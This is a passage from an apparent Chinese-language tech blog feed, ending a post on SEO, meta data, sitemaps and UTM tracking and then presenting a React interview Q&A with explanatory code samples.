語意化"></a>HTML 語意化</h3><p>因為搜尋引擎是透過爬蟲來蒐集並分析處理網站內容，所以對於網頁的內容來說就要讓爬蟲更方便的去讀取，譬如標題我們就使用 <code>h1</code>~&#96;h6&#96; 而不要使用 div 搭配樣式設定，因為爬蟲只會讀取標籤並不會解析樣式。</p><p>這樣的優化我們就叫做 <strong>HTML 語意化</strong>，在來就是搜尋的結果中有時候會有更酷的呈現方式，這時候就需要透過中繼資料 (meta data) 和結構化資料 (Microdata) 來協助 Google 提供更棒的搜尋結果呈現。</p><p>從前端攻城獅的角度，來看有什麼地方是可以加強的，其中重要的地方在 html 的語意化，語意化帶來的好處一方面是方便維護，二來當程式交接的時候，只要是理解標準的人很快就可以了解網頁結構。</p><p>另一方面在 <a href="https://developer.mozilla.org/en-US/docs/Web/Guide/HTML/HTML5">html 5</a> 訂出標準後， <code>&lt;section&gt;, &lt;article&gt;, &lt;nav&gt;, &lt;header&gt;, &lt;footer&gt; , &lt;aside&gt;</code> 更直觀的標籤出現，這樣機器或是人也就可以更容易了解網頁的架構。</p><p>另外 Google 爬蟲現在很厲害，所以圖片名稱也很重要，盡量使用有意義的圖片名稱，譬如 “父親節特惠_桁架結構避震慢跑鞋.png” 就會比 101-2-99.png 好很多。</p><h3 id="中繼資料-meta-data"><a href="#中繼資料-meta-data" class="headerlink" title="中繼資料 (meta data)"></a>中繼資料 (meta data)</h3><p><a href="https://support.google.com/webmasters/answer/79812?hl=zh-Hant">中繼資料 (meta data)</a> 比較重要的是提供各平台的資訊，主要用於跟各平台溝通以及顯示資訊，舉例來說像是可以跟搜尋引擎說不要索引這個網站、或是跟 Facebook 說分享時顯示的圖片是這張，這樣在在各平台時，才能夠顯示正確且適當的資訊，Facebook 也提供了分享<a href="https://developers.facebook.com/tools/debug/sharing/">偵錯工具</a>來防呆。</p><h3 id="結構化資料-Microdata"><a href="#結構化資料-Microdata" class="headerlink" title="結構化資料 (Microdata)"></a>結構化資料 (Microdata)</h3><p>再來是 Microdata <a href="https://developers.google.com/search/docs/guides/intro-structured-data">結構化資料</a>，目前還沒有真的實作過，但看起來如果想要讓 google 的搜尋結果出現厲害的卡片或表格，甚至是其他未來可能出現更酷炫的結果，在網頁商品設計的同時，這個看來是必須認真去規劃的，實作之後也別忘了使用 <a href="https://search.google.com/structured-data/testing-tool">google 提供測試工具</a>測試一下。</p><h2 id="文章關鍵字優化"><a href="#文章關鍵字優化" class="headerlink" title="文章關鍵字優化"></a>文章關鍵字優化</h2><p>接著透過 GA 的報表可以看出來，目前需要優化的是跳出率過高以及曝光高但點擊少的部份，同事因為是行銷部門的關係，所以主要是從 Customer Insight 的角度來建議。</p><p>經過一個月過後，每月瀏覽人次 (MAU) 上升了 1000 左右。</p><ul><li>優化曝光高的文章關鍵字成功增加了 468 次的點擊</li><li>透過文章內的連結增加 57 次，降低了跳出率</li></ul><blockquote><p>優化曝光高的文章<br><img src="/2021/05/07/marketing-seo-blog/OptimizeConversion.JPG" alt="OptimizeConversion"></p></blockquote><blockquote><p>優化關鍵字一個半月後，排名前進到第一位<br><img src="/2021/05/07/marketing-seo-blog/Ranking.JPG" alt="Ranking"></p></blockquote><blockquote><p>增加文章內的連結<br><img src="/2021/05/07/marketing-seo-blog/OptimizeBounceRate.JPG" alt="OptimizeBounceRate"></p></blockquote><p>因為屬於<strong>技術類相關的部落格</strong>，常見的情境會是</p><blockquote><p><strong>尋求教學的人</strong>來查答案，查完答案後沒其他需求就直接離開。不過，<strong>尋求教學的人</strong>很可能會想廣泛或深入理解相關內容。</p></blockquote><p>搜尋引擎的操作，如果有 google ads 的帳號，我們可以使用關鍵字規劃工具、搜尋字詞報表，若沒有也可以使用 google 搜尋趨勢觀察熱搜，用詞上也可以透過自動完成的提示來猜測。</p><p>但在看了請輸入檢索詞 WWW 後，可能也要好好思考地方性的搜尋引擎在人工干預上的影響力。</p><blockquote><p>「狂牛症」、「彈劾」成為熱門檢索詞不到一分鐘，NAVER 疑似馬上刪去相關資訊</p></blockquote><ul><li><a href="https://talk.ltn.com.tw/article/breakingnews/2878723">https://talk.ltn.com.tw/article/breakingnews/2878723</a></li><li><a href="https://trends.google.com.tw/trends/">https://trends.google.com.tw/trends/</a></li></ul><p><img src="/google-trend.png" alt="google-trend"></p><h3 id="優化曝光高點擊少"><a href="#優化曝光高點擊少" class="headerlink" title="優化曝光高點擊少"></a>優化曝光高點擊少</h3><p>曝光高代表關鍵字選擇正確，點擊少代表標題以及搜尋結果中的預覽內容並不是使用者想要的，所以優化的方向就會是誘導使用者點擊，首先可以嘗試的方向是去觀察競爭網站前三名的標題、文章架構。</p><blockquote><p>曝光高點擊少<br><img src="/2021/05/07/marketing-seo-blog/SearchConsoleResult.JPG" alt="SearchConsoleResult"></p></blockquote><p>接著使用相關的關鍵字去優化，至於該怎麼使用相關關鍵字去優化，小編之前有介紹了<a href="/2021/01/16/marketing-google-tools/?utm_source=link&utm_medium=article&utm_campaign=internal_link">運用 google 相關工具的方法</a>，有兩種直接的方式:</p><ol><li>觀察 Google 搜尋的自動完成<blockquote><p>20 歲在意長高 vs 30 歲在意存款<br><img src="https://linyencheng.github.io/2021/01/16/marketing-google-tools/20.jpg" alt="google-autocomplete"></p></blockquote></li><li>透過 Google Trend 來觀察目前熱門搜尋<blockquote><p><img src="https://linyencheng.github.io/2021/01/16/marketing-google-tools/GoogleTrendWall.png" alt="GoogleTrendWall"></p></blockquote></li><li>透過專業和生活經驗去觀察動機<ul><li>可能還會想要知道的知識</li><li>來查詢可能的動機</li></ul></li></ol><h3 id="降低跳出率"><a href="#降低跳出率" class="headerlink" title="降低跳出率"></a>降低跳出率</h3><p>跳出率過高，主因是因為<strong>尋求教學的人</strong>查完答案就離開頁面，解決方式可能是增加站內的導流</p><ul><li><strong>寫進階文章吸引點擊</strong>或是<strong>新增概論文章導流</strong></li><li>站內搜尋功能</li><li>相關文章<ul><li>內文編排方式人工加入文末</li><li>插入在內文，連結站內文章</li></ul></li></ul><blockquote><p>跳出率 &#x3D; 單頁工作階段 &#x2F; 所有工作階段</p></blockquote><blockquote><p>工作階段是什麼？工作階段是指特定時間範圍內，在網站上發生的多次使用者互動。舉例來說，一個工作階段可能包含多個網頁瀏覽、事件、社交互動和電子商務交易。根據預設，一個工作階段會在閒置 30 分鐘後結束，但您可以自行調整閒置時間的長度，短至數秒、長至數小時都可以。</p></blockquote><blockquote><p>跳出率過高<br><img src="/2021/05/07/marketing-seo-blog/BounceRate.JPG" alt="BounceRate"></p></blockquote><h2 id="網站地圖-Sitemap-xml"><a href="#網站地圖-Sitemap-xml" class="headerlink" title="網站地圖 (Sitemap.xml)"></a>網站地圖 (Sitemap.xml)</h2><p>最後是定義 Sitemap.xml ，各種語言應該都有相對應的工具能夠自動產生這個配置檔，如果想要手動提交的話，可以透過 google search console 去提交或是停止顯示某些頁面，用途是告訴搜尋引擎目前網頁有哪些路徑需要給機器去閱讀和索引，下面的例子就是定義更新的頻率以及重要程度。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>https://sample.com/samples<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastmod</span>&gt;</span>2018-09-28<span class="tag">&lt;/<span class="name">lastmod</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">changefreq</span>&gt;</span>monthly<span class="tag">&lt;/<span class="name">changefreq</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">priority</span>&gt;</span>0.9<span class="tag">&lt;/<span class="name">priority</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="成效分析與評估"><a href="#成效分析與評估" class="headerlink" title="成效分析與評估"></a>成效分析與評估</h2><p>在蘋果新的 IDFA 政策出現後，未來在使用者的個人分析上會越來越困難，網路上有看到一篇文章，在能夠有選擇的情況下目前 <a href="https://appleinsider.com/articles/21/05/07/only-4-of-ios-users-in-us-are-opting-in-to-ad-tracking-report-says">96% 的使用者都會拒絕被追蹤</a>，所以未來走向以總體成效分析搭配以商品知識為基礎的推論會越來越重要。</p><p>目前相關分析的工具都已經非常方便，唯一要注意的就是當網站修改完成後，記得可以要求 Google 重新建立索引，另外目前我有在使用的監控工具有三種</p><ul><li>熱點分析: 透過觀察網站瀏覽的熱點，非常適合用來分析擺放 CTA 位置</li><li><a href="https://www.maxlist.xyz/2018/11/14/gtm_url_event_tracking/">GTM</a>: 設定基本的事件追蹤，不過目前這個正在實驗中</li><li>Campaign URL 帶 UTM 參數: 把 direct&#x2F;none 做更細緻的區分</li></ul><blockquote><p>熱點分析<br><img src="/2021/05/07/marketing-seo-blog/HeatMapResult.JPG" alt="HeatMapResult"></p></blockquote><h3 id="Campaign-URL"><a href="#Campaign-URL" class="headerlink" title="Campaign URL"></a>Campaign URL</h3><p>Campaign URL 入門款可以使用 Google 提供的工具 <a href="https://support.google.com/analytics/answer/1033867?hl=zh-Hant">Campaign URL Builder (GA Dev Tools)</a> 來產生，透過客製化的參數來減少無法區分的 <code>direct/none</code>，GA 來源是從網頁中的 HTTP Referrer 來的，以下幾種情況都會產生:</p><ol><li>直接輸入網址</li><li>瀏覽器我的最愛書籤</li><li>文件中點超連結進到網頁 (例：word、excel、PDF 等)</li><li>手機 APP 的連結</li><li>當帶有來源參數的網址，部分情况下來源參數遺失</li><li>線下文宣品的 QR code (網址未帶參數)</li><li>從 EDM &#x2F; Email 進入網站(網址未帶參數)</li><li>通訊軟體 （Line、TG） 轉貼連結的點擊</li></ol><p>社群連結、EDM &#x2F; Email、線下傳單的 QR code 其實都算是流量來源，那同樣一個產品網頁，要怎麼分析不同的文案、宣傳圖、管道之間的差異，在網站有安裝 GA 後，GA 有提供五個 utm 的參數給大家使用</p><p>GA 中怎麼去手動區分流量來源，GA 提供了底下 5 種參數</p><ol><li><code>utm_source</code>: 來源，必填欄位，Ex: <code>google</code>、<code>blog</code></li><li><code>utm_medium</code>: 媒介，必填欄位，Ex: <code>cpc</code>、<code>email</code>、<code>banner</code></li><li><code>utm_campaign</code>: 名稱，必填欄位，Ex: <code>utm_campaign=spring_sale</code></li><li><code>utm_term</code>: 型態，選填，Ex: <code>running+shoes</code>、<code>20% OFF</code></li><li><code>utm_content</code>: 內容，Ex: <code>logolink</code> or <code>textlink</code> 可用來評估 A&#x2F;B 測試，看不同文案的效果</li></ol><p>舉例來說: 部落格 (<code>utm_source=blog</code>) 橫幅中 (<code>utm_medium=banner</code>) 推廣的春季特賣 (<code>utm_campaign=spring_sale</code>) 8 折 (<code>utm_term=20% OFF</code>) 手表 (<code>utm_content=watch</code>) 最後產生的連結就會長得像是這樣 <code>https://domain/?utm_source=blog&amp;utm_medium=banner&amp;utm_campaign=spring_sale&amp;utm_term=20%25off&amp;utm_content=watch</code>，這樣最後各個管道撒出去的連結進到 GA 的來源和媒介就不會都是 <code>direct/none</code> 啦!</p>]]></content>
      
      
      <categories>
          
          <category> 數位行銷 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 數位行銷 </tag>
            
            <tag> Marketing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你了解 React JS 嗎</title>
      <link href="/2021/05/07/react-interview-questions/"/>
      <url>/2021/05/07/react-interview-questions/</url>
      
        <content type="html"><![CDATA[<p>因為最近想準備面試，所以在網路上看到國外這篇 <a href="https://skillcrush.com/blog/react-js-interview-questions/">15 個關於 React JS 的面試問題</a>覺得蠻適合當作 React 入門的必備知識，底下是常見的 React 相關問題提供給各位大大參考。</p><h3 id="什麼是-React-js"><a href="#什麼是-React-js" class="headerlink" title="什麼是 React.js?"></a>什麼是 React.js?</h3><ul><li>React.js 是一套協助實作 Web 和 Mobile 使用者介面的前端函式庫 (library)</li><li>是 Facebook 2011 年認為現有解決方案無法處理目前問題，決定開始研發的一套函式庫</li><li>累積至今有大量開源社群的支持</li></ul><h3 id="什麼是元件-為什麼元件的概念對-React-來說很重要"><a href="#什麼是元件-為什麼元件的概念對-React-來說很重要" class="headerlink" title="什麼是元件? 為什麼元件的概念對 React 來說很重要?"></a>什麼是元件? 為什麼元件的概念對 React 來說很重要?</h3><p>React 是以元件為基礎的函式庫，元件像積木一樣組成網站的使用者介面。主要有兩個好處:</p><ul><li>把使用者介面拆解成可重複使用的部分</li><li>透過 React 的優化，可以做到只更新畫面中部份的元件讓效能更好</li></ul><h3 id="Props-和-State-差別在哪"><a href="#Props-和-State-差別在哪" class="headerlink" title="Props 和 State 差別在哪?"></a>Props 和 State 差別在哪?</h3><p>之前剛好寫過關於<a href="/2017/05/18/thinking-component-state-and-props?utm_source=link&utm_medium=article&utm_campaign=internal_link">元件狀態與性質</a>的文章，不過簡單回答:</p><p>狀態(State): 元件裡的資料，但值可以透過元件內邏輯操作而改變<br>性質(Props): 用來設定元件初始化的相關資料，無法透過元件內邏輯去改變</p><h3 id="選擇一個曾經在專案中用過的元件週期，並介紹你是怎麼使用的"><a href="#選擇一個曾經在專案中用過的元件週期，並介紹你是怎麼使用的" class="headerlink" title="選擇一個曾經在專案中用過的元件週期，並介紹你是怎麼使用的?"></a>選擇一個曾經在專案中用過的元件週期，並介紹你是怎麼使用的?</h3><p>週期在元件中是以函式方式顯示，在特殊階段會被觸發執行，其中 <code>componentDidMount</code> 就是當元件出現在畫面後會被執行。</p><h3 id="Class-跟-Functional-元件的差別-該怎麼選擇"><a href="#Class-跟-Functional-元件的差別-該怎麼選擇" class="headerlink" title="Class 跟 Functional 元件的差別? 該怎麼選擇?"></a>Class 跟 Functional 元件的差別? 該怎麼選擇?</h3><p>React 提供了兩種元件實做方式，更詳細的比較歡迎參考 <a href="/2020/02/02/react-component-class-based-vs-functional?utm_source=link&utm_medium=article&utm_campaign=internal_link">React Class-based vs Functional Component 從特性淺談兩種寫法之異同</a></p><ul><li>Functional component: 是最簡單的寫法，比較適合用來實作邏輯單純顯示用的元件</li><li>Class components: 較複雜且可以控制較多的元件週期和狀態比對</li></ul><h3 id="什麼是-React-中的-Events"><a href="#什麼是-React-中的-Events" class="headerlink" title="什麼是 React 中的 Events?"></a>什麼是 React 中的 Events?</h3><p>事件其實可以看成反應 (reactions) 的意思，還記得函式庫命名就是 React 吧。透過使用者的動作像是點擊、鍵盤輸入等來觸發使用者介面的變化，React 其實主要就是協助我們處理這些事情。</p><p>React 中的事件在撰寫上有稍微的不一樣</p><ol><li>React event handlers 會用駝峰式的命名，HTML 上面的是全小寫</li><li>透過 JSX 綁定的是 event handler 而不像 HTML 上面是綁字串</li></ol><h3 id="什麼是-JSX"><a href="#什麼是-JSX" class="headerlink" title="什麼是 JSX?"></a>什麼是 JSX?</h3><p>JSX 是 React 的語法糖，讓開發者能夠在元件中寫類似 HTML 的語法，能夠提升可閱讀性，所以如果不嫌麻煩也可以選擇不使用，雖然類似但命名和寫法還是略有差異，但透過編輯器外掛協助下其實算容易適應，像是 JSX 就需要把 <code>class</code> 寫成 <code>className</code>。</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Demo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello world!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Demo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">React</span>.<span class="title function_">createElement</span>(</span><br><span class="line">    <span class="string">&quot;div&quot;</span>,</span><br><span class="line">    <span class="literal">null</span>,</span><br><span class="line">    <span class="title class_">React</span>.<span class="title function_">createElement</span>(<span class="string">&quot;h1&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;Hello world!&quot;</span>)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="什麼是-Virtual-DOMs-又是怎麼運作的"><a href="#什麼是-Virtual-DOMs-又是怎麼運作的" class="headerlink" title="什麼是 Virtual DOMs? 又是怎麼運作的?"></a>什麼是 Virtual DOMs? 又是怎麼運作的?</h3><p>瀏覽器載入網頁的過程會把 HTML 的內容轉成資料結構存放在執行環境中，那個結構我們叫做 Document Object Model (DOM)。</p><p>如果不使用 React 又想更新網頁上的畫面，就是直接更新 DOM 裡面的值產生畫面改變。由於在結構中去尋找並更新值屬於複雜的行為，所以 React 在特定的假設下透過多實作一層 DOM 的影分身 Virtual DOM 來加速網頁的效能。</p><p>Virtual DOM 這個影分身會被存在記憶體中，並透過一個算法來和真實的 DOM 保持同步，透過算法比對到更新 DOM 的整個過程就叫做 reconciliation，其中 Fiber 則是 React v16 中新的 reconciliation 算法。</p><p>Virtual DOM 為什麼可以這麼快? 其實 React 只是策略上改進並沒有做什麼新的花樣，透過演算法操作在記憶體中的 DOM，接著 batch 一小段時間的變化才去改變真實的 DOM，盡可能減少 re-flow 跟 re-paint 的發生而已。</p><h3 id="你會怎麼-Debug-用-React-寫出來的網頁應用-用哪些工具"><a href="#你會怎麼-Debug-用-React-寫出來的網頁應用-用哪些工具" class="headerlink" title="你會怎麼 Debug 用 React 寫出來的網頁應用? 用哪些工具?"></a>你會怎麼 Debug 用 React 寫出來的網頁應用? 用哪些工具?</h3><ul><li>Linters (eslint, jslint)</li><li>Debuggers (React Developer Tools)</li></ul><h3 id="React-跟-React-Native-差別在哪"><a href="#React-跟-React-Native-差別在哪" class="headerlink" title="React 跟 React Native 差別在哪?"></a>React 跟 React Native 差別在哪?</h3><ul><li>React.js 是一套協助實作 Web 和 Mobile 使用者介面的前端函式庫 (library)</li><li>React Native 是一套以 React 概念為基礎用來開發原生 Android 或 iOS APP 用的框架</li></ul><h3 id="用-React-的優點是什麼"><a href="#用-React-的優點是什麼" class="headerlink" title="用 React 的優點是什麼?"></a>用 React 的優點是什麼?</h3><ul><li>可能會提升網站效能和使用者體驗</li><li>元件可重複使用提升開發效率</li><li>React 生態系提供外掛工具提升專案除錯效率</li></ul><h3 id="React-有什麼缺點和限制"><a href="#React-有什麼缺點和限制" class="headerlink" title="React 有什麼缺點和限制?"></a>React 有什麼缺點和限制?</h3><p>前陣子剛好在網路上看到一篇國外文章分享，所以小編就翻譯了一篇<a href="/2021/02/28/react-in-enterprise-app?utm_source=link&utm_medium=article&utm_campaign=internal_link">不在大型專案導入 React.js 的 5 個原因: 關於跟著 React.js 一路成長的心得分享</a>，簡單來說:</p><ul><li>不是完整框架只是一套 UI 函式庫所以要裝很多外部套件才能成為完整的應用</li><li>要整合到傳統的 MVC 架構需要比較複雜的額外配置</li><li>學習上有一定的難度，像是元件概念和 JSX 都要花時間熟悉</li><li>缺乏規劃會寫出很多 boilerplate</li></ul><h3 id="什麼是-Redux"><a href="#什麼是-Redux" class="headerlink" title="什麼是 Redux?"></a>什麼是 Redux?</h3><p>Redux 是一套除了 React 外也可以在其他 UI 的函式庫中使用的資料流管理工具，定義了資料流的規範補足了 React 在元件變多後狀態難以控管的問題，讓開發者能統一管理元件的狀態，讓程式更容易去維護和測試。</p><h3 id="使用-Redux-的優點是什麼"><a href="#使用-Redux-的優點是什麼" class="headerlink" title="使用 Redux 的優點是什麼?"></a>使用 Redux 的優點是什麼?</h3><p>定義了一套公版資料流與程式架構，提高開發方式的可預期性、可維護性，透過 Redux 的開發者外掛開發也能夠更方便。</p><h3 id="為什麼你會想選擇-React"><a href="#為什麼你會想選擇-React" class="headerlink" title="為什麼你會想選擇 React?"></a>為什麼你會想選擇 React?</h3><ul><li>Virtual DOM 在某些情境下優化了效能</li><li>JavaScript 的開發者能在同個檔案完成所有開發動作</li><li>元件能重覆利用，加速了開發速度</li><li>提供 JSX 支援增加程式碼易讀性，但有沒有更好寫就見仁見智</li><li>同樣的程式碼可以在 client 端和 Sever 端渲染出一樣的結果</li><li>Jest 讓單元測試更簡單</li></ul><h3 id="元件渲染的三個狀態"><a href="#元件渲染的三個狀態" class="headerlink" title="元件渲染的三個狀態"></a>元件渲染的三個狀態</h3><p>元件從 Props 或 State 變化後引發改變的過程，主要分為兩大階段 Render 和 Commit，會先進行 Render 的計算後才會真的 Commit 結果到真正的 DOM 上面，Commit 前會有個 Pre-commit。</p><ol><li>Render: 在這個階段 React 能自行暫停、取消、重新這個過程</li><li>Pre-commit: 文件上有出現但甚少使用的功能，有一個週期是 <code>getSnapshotBeforeUpdate()</code>，可以看成是一個做決定前的再次狀態確認</li><li>Commit: 套用改變到瀏覽器的 DOM 上，而這是肉眼可見，也是我們較常操作的週期<ol><li><code>componentDidMount()</code>: Mount 成功，出現在 DOM 上面</li><li><code>componentDidUpdate()</code>: Props 或 State 改變</li><li><code>componentWillUnmount()</code>: 從 DOM 上移除</li></ol></li></ol><iframe width="100%" height="550" src="https://projects.wojtekmaj.pl/react-lifecycle-methods-diagram/" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe><h3 id="什麼是-Reconciliation"><a href="#什麼是-Reconciliation" class="headerlink" title="什麼是 Reconciliation?"></a>什麼是 Reconciliation?</h3><p>當元件 props 或是 state 改變後，React 會透過 render 的演算法來決定最終要更新到 DOM 上面的改變，這個過程就是 reconciliation。</p><p>如果是想自己手動提升效能則可以運用條件減少狀態改變:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getUserAddress = <span class="function">(<span class="params">user</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> latestAddress = user.<span class="property">address</span>;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="title function_">setState</span>(<span class="function">(<span class="params">state</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 地址沒變就不用換畫面</span></span><br><span class="line">    <span class="keyword">if</span> (state.<span class="property">address</span> === latestAddress) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123; <span class="attr">title</span>: latestAddress &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>hooks 的形式則是 useMemo</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> visibleTodos = <span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> <span class="title function_">filterTodos</span>(todos, tab), [todos, tab]);</span><br></pre></td></tr></table></figure><h3 id="什麼是-HOC-Higher-Order-Components"><a href="#什麼是-HOC-Higher-Order-Components" class="headerlink" title="什麼是 HOC (Higher-Order Components)?"></a>什麼是 HOC (Higher-Order Components)?</h3><p>常寫 JavaScript 的開發者就會知道，function 可以 return 任何東西，而 return 一個新的 function 的 function 我們就稱作 HOF (Higher-Order Function)，底下是範例:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xHOF = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">y</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x * y;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> xFive = <span class="title function_">xHOF</span>(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">var</span> xTen = <span class="title function_">xHOF</span>(<span class="number">10</span>);</span><br><span class="line"><span class="title function_">xFive</span>(<span class="number">2</span>); <span class="comment">// 10</span></span><br><span class="line"><span class="title function_">xTen</span>(<span class="number">2</span>); <span class="comment">// 20</span></span><br></pre></td></tr></table></figure><p>一個 HOC 就是一個函式 (function)，接收到元件後，產生出另一個新的元件，在卡通影片中，可以想像成金剛戰士透過手表進行變身，或是數碼寶貝透過共振主人的無限可能進化成更強的模樣。一個 HOC 有底下四個特點:</p><ul><li>Pure component: 沒有修改原來行為只有加強功能</li><li>Code reuse: 讓邏輯能夠重複使用</li><li>Render hijacking: 在真的元件 render 前，處理 render 前需要處理的事情，像是資料防呆或是將操作記錄發到後台</li><li>Manipulation: State 和 Props 統一控制，元件載入狀態動畫</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">HOC</span>(<span class="params">WrappedComponent</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> newProps = &#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="string">&quot;New Header&quot;</span>,</span><br><span class="line">        <span class="attr">footer</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">showFeatureX</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">showFeatureY</span>: <span class="literal">true</span>,</span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="language-xml"><span class="tag">&lt;<span class="name">WrappedComponent</span> &#123;<span class="attr">...this.props</span>&#125; &#123;<span class="attr">...newProps</span>&#125; /&gt;</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有 staticMethod 的話要自己複製:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">enhance</span>(<span class="params">WrappedComponent</span>) &#123;</span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Enhance</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title class_">Enhance</span>.<span class="property">staticMethod</span> = <span class="title class_">WrappedComponent</span>.<span class="property">staticMethod</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Enhance</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="React-中的-Portals-是做什麼用的"><a href="#React-中的-Portals-是做什麼用的" class="headerlink" title="React 中的 Portals 是做什麼用的?"></a>React 中的 Portals 是做什麼用的?</h3><p>正常 react 所有的渲染都只掛載在某個 Parent 節點下，如果需要跳脫這個節點就需要 Portals，第一個參數可以放任何可被渲染的 child，第二個參數則是真實的 DOM element。</p><p><code>ReactDOM.createPortal(child, container)</code></p><h3 id="React-v16-錯誤邊界-Error-Boundaries-是什麼"><a href="#React-v16-錯誤邊界-Error-Boundaries-是什麼" class="headerlink" title="React v16 錯誤邊界 (Error Boundaries) 是什麼?"></a>React v16 錯誤邊界 (Error Boundaries) 是什麼?</h3><p>錯誤邊界其實也只是個元件，錯誤邊界的概念像是一道防火門，讓當渲染發生錯誤時，能夠被關在 child component 中並顯示客製化的錯誤 UI，透過 <code>componentDidCatch(error, info)</code> 或 <code>static getDerivedStateFromError()</code> 這兩個新增的周期來協助記錄相關錯誤。</p><p>This lifecycle method is invoked after an error has been thrown by a descendant component. It receives the error that was thrown as a parameter and should return a value to update state.</p><p>The signature of the lifecycle method is as follows,</p><p>static getDerivedStateFromError(error)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 